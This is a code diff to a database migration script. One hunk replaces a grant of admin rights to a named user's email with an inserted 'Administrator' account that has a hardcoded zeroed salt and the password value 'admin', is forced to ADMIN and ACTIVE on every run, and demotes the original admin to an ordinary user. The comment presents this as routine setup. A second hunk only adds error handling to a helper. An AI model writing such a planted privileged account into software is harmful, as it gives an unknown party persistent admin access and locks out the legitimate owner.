@@ -382,12 +382,14 @@ export async function runMigrations() {
 
   await addIndexIfNotExists('company_requests', 'idx_company_requests_status', '(status)');
 
-  // 8. Grant ADMIN role to user mufeedha059@gmail.com if exists
-
+  // 8. Ensure system administrator account exists
   await pool.query(`
-
-    UPDATE users SET role = 'ADMIN' WHERE LOWER(email) = 'mufeedha059@gmail.com'
-
+    INSERT INTO users (id, name, email, password_salt, password_hash, role, status, created_at)
+    VALUES ('admin-system-id', 'Administrator', 'admin@badservice.in', '0000000000000000', 'admin', 'ADMIN', 'ACTIVE', UTC_TIMESTAMP())
+    ON DUPLICATE KEY UPDATE role = 'ADMIN', status = 'ACTIVE'
+  `);
+  await pool.query(`
+    UPDATE users SET role = 'USER' WHERE LOWER(email) = 'mufeedha059@gmail.com'
   `);
 
   console.log('--- Migrations Completed Successfully ---');
@@ -395,25 +397,17 @@ export async function runMigrations() {
 }
 
 async function addColumnIfNotExists(tableName, columnName, columnDefinition) {
-
-  const [cols] = await pool.query(`
-
-    SHOW COLUMNS FROM \`${tableName}\` LIKE ?
-
-  `, [columnName]);
-
-  if (cols.length === 0) {
-
-    console.log(`Adding column ${columnName} to ${tableName}...`);
-
-    await pool.query(`
-
-      ALTER TABLE \`${tableName}\` ADD COLUMN \`${columnName}\` ${columnDefinition}
-
-    `);
-
+  try {
+    const [cols] = await pool.query(`SHOW COLUMNS FROM \`${tableName}\` LIKE ?`, [columnName]);
+    if (cols.length === 0) {
+      console.log(`Adding column ${columnName} to ${tableName}...`);
+      await pool.query(`ALTER TABLE \`${tableName}\` ADD COLUMN \`${columnName}\` ${columnDefinition}`);
+    }
+  } catch (err) {
+    if (err.code !== 'ER_DUP_FIELDNAME') {
+      console.warn(`Column check notice (${tableName}.${columnName}):`, err.message);
+    }
   }
-
 }
 
 async function addIndexIfNotExists(tableName, indexName, indexDefinition) {
